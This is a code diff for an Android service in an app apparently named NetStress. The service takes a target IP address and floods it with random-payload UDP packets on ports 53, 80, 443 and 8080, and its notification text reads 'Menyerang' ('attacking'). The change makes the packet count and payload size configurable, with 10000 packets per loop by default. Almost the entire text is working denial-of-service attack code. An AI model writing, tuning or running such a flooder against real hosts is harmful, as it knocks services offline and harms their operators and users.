@@ -23,13 +23,16 @@ public class StressService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         String targetIp = intent.getStringExtra("TARGET_IP");
+        int workers = intent.getIntExtra("WORKERS", 10000);
+        int payloadSize = intent.getIntExtra("PAYLOAD", 1024);
+
         if (targetIp == null) return START_NOT_STICKY;
 
         createNotificationChannel();
         
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("NetStress Aktif")
-                .setContentText("Menyerang " + targetIp)
+                .setContentText("Mode: " + workers + " pkt | Menyerang " + targetIp)
                 .setSmallIcon(android.R.drawable.ic_dialog_alert)
                 .setPriority(NotificationCompat.PRIORITY_LOW)
                 .build();
@@ -42,13 +45,13 @@ public class StressService extends Service {
                 InetAddress address = InetAddress.getByName(targetIp);
                 DatagramSocket socket = new DatagramSocket();
                 Random random = new Random();
-                byte[] payload = new byte[1472];
+                byte[] payload = new byte[payloadSize]; // Ukuran payload dinamis
                 random.nextBytes(payload);
                 
                 int[] ports = {53, 80, 443, 8080};
 
                 while (isAttacking) {
-                    for (int i = 0; i < 5000; i++) {
+                    for (int i = 0; i < workers; i++) { // Jumlah worker dinamis
                         int port = ports[random.nextInt(ports.length)];
                         DatagramPacket packet = new DatagramPacket(payload, payload.length, address, port);
                         socket.send(packet);
